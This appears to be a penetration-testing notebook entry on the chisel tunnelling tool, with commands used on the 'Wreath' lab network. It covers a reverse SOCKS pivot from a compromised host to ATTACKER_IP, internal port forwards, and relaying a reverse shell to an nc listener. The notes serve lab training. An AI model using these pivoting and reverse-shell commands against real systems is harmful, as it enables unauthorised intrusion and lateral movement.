# chisel

Fast TCP/UDP tunnel over HTTP, useful for reverse SOCKS pivots and port forwards when SSH is unavailable or blocked.

## Commands Used

### Reverse SOCKS pivot

```bash
# Attacker / pivot controller
./chisel server -p 15000 --reverse &

# Compromised pivot host
./chisel client ATTACKER_IP:15000 R:socks &
```

Used on: **Wreath** - exposed the internal `10.200.180.0/24` network through a SOCKS5 proxy on the attacker side.

Configure `proxychains.conf` with:

```ini
socks5 127.0.0.1 1080
```

### Reverse remote port forward

```bash
# Pivot host
./chisel server -p 16000 --reverse &

# Internal Windows host
./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
```

Used on: **Wreath** - exposed `10.200.180.100:80` through `10.200.180.200:15001`.

### Relay a reverse shell through an intermediate host

```bash
# Intermediate host
./chisel server -p 16000 --reverse &

# Attacker
./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
rlwrap nc -lvnp 4444
```

Used on: **Wreath** - the GitStack host could reach the intermediate server but not Kali directly.

## Notes

- Reverse mode requires `--reverse` on the server.
- `R:socks` opens SOCKS5 on the server side, commonly `127.0.0.1:1080`.
- `R:LPORT:RHOST:RPORT` means the server listens on `LPORT` and sends traffic through the client to `RHOST:RPORT`.

## Related

- [proxychains](proxychains.md)
- [foxyproxy](foxyproxy.md)
- [chisel-pivoting.md](../../techniques/pivot/chisel.md)


